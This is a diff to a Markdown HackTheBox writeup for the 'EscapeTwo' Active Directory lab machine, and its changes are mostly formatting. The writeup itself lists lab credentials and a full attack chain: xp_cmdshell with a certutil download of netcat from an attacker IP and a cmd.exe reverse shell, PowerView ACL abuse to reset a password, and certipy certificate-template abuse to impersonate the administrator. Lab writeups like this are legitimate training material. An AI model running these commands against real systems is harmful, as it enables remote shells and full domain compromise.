@@ -1,11 +1,12 @@
 ---
 title: EscapeTwo - Active directory
 date: 2025-12-10 00:00:00 +0000
-categories: [HackTheBox Writeups]
+categories: [HackTheBox Writeups, Windows]
 tags: [hackthebox, windows]
 ---
 
-```bash
+
+```
 ares@legion:~/HackTheBox/EscapeTwo$ sudo nmap -sVC -A -T4 10.129.63.50           
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-16 14:00 EET
 Nmap scan report for 10.129.63.50 (10.129.63.50)
@@ -94,16 +95,19 @@ HOP RTT      ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 99.20 seconds
-```bash
+```
+
 rose / KxEPkKe6R8su
 
 Download shares 
 ```
 smbclient //10.129.232.128/"Accounting Department" -U rose
 ```
-```bash
+
+```
 echo "10.129.63.50 sequel.htb dc01.sequel.htb" | sudo tee -a /etc/hosts
-```bash
+```
+
 Creds from excel:
 
 |        |          |                                               |        |                  |
@@ -114,7 +118,7 @@ Creds from excel:
 | NULL   | NULL     | [sa@sequel.htb](mailto:sa@sequel.htb)         | sa     | MSSQLP@ssw0rd!   |
 
 Can either grep and read each line from .xml or change magic bytes to  open xlsx format:
-![20251116140452.png](/assets/img/htb-writeups/Pasted image 20251116140452.png)
+![[Pasted image 20251116140452.png]]
 
 Lateral Movement:
 ```
@@ -126,24 +130,25 @@ enable_xp_cmdshell
 EXEC xp_cmdshell 'certutil -urlcache -split -f http://10.10.14.76:8000/nc64.exe C:\Users\sql_svc\Desktop\nc64.exe';
 
 EXEC xp_cmdshell 'C:\Users\sql_svc\Desktop\nc64.exe -e cmd.exe 10.10.14.76 4444';
-```bash
+```
 https://github.com/vinsworldcom/NetCat64/releases
 
 
-![20251116142803.png](/assets/img/htb-writeups/Pasted image 20251116142803.png)
+![[Pasted image 20251116142803.png]]
 
 > Pay attention to: sql-Configuration.INI
 New pass to add to creds: 
 WqSZAF6CysDQbGb3 + user ryan 
-![20251116142839.png](/assets/img/htb-writeups/Pasted image 20251116142839.png)
+![[Pasted image 20251116142839.png]]
 
 
 Privesc Winrm ryan session:
 ```
 bundle exec evil-winrm.rb -i 10.129.56.175 -u ryan -p 'WqSZAF6CysDQbGb3'
-```bash
+```
+
 WriteOwner permissions over the user CA_SVC
-```bash
+```
 certutil -urlcache -split -f http://10.10.14.76:8000/PowerView.ps1 C:\Users\ryan\Desktop\PowerView.ps1
 Import-Module .\PowerView.ps1
 Set-DomainObjectOwner -Identity "ca_svc" -OwnerIdentity "ryan"
@@ -151,10 +156,12 @@ Add-DomainObjectAcl -TargetIdentity "ca_svc" -Rights ResetPassword -PrincipalIde
 $cred = ConvertTo-SecureString "Password123!!" -AsPlainText -Force 
 Set-DomainUserPassword -Identity "ca_svc" -AccountPassword $cred
 ```
+
 ```
 certipy find -u 'ca_svc@sequel.htb' -p 'Password123!!' -dc-ip 10.129.56.175 -stdout
 ```
-```bash
+
+```
 certipy-ad template \
   -u ca_svc@sequel.htb \
   -p 'Password123!!' \
@@ -163,9 +170,10 @@ certipy-ad template \
   -force \
   -dc-ip 10.129.232.128
 
-```bash
+```
+
 Modify DunderMifflinAuthentication.json:
-![20251117122102.png](/assets/img/htb-writeups/Pasted image 20251117122102.png)
+![[Pasted image 20251117122102.png]]
 
 ```
 certipy-ad req \
@@ -175,13 +183,13 @@ certipy-ad req \
   -template DunderMifflinAuthentication \
   -target dc01.sequel.htb \
   -upn administrator@sequel.htb
-```bash
-![20251117122313.png](/assets/img/htb-writeups/Pasted image 20251117122313.png)
+```
+![[Pasted image 20251117122313.png]]
 
 ```
 certipy-ad auth \
   -pfx administrator.pfx \
   -domain sequel.htb \
   -dc-ip 10.129.232.128
-```bash
-![20251117122409.png](/assets/img/htb-writeups/Pasted image 20251117122409.png)
+```
+![[Pasted image 20251117122409.png]]
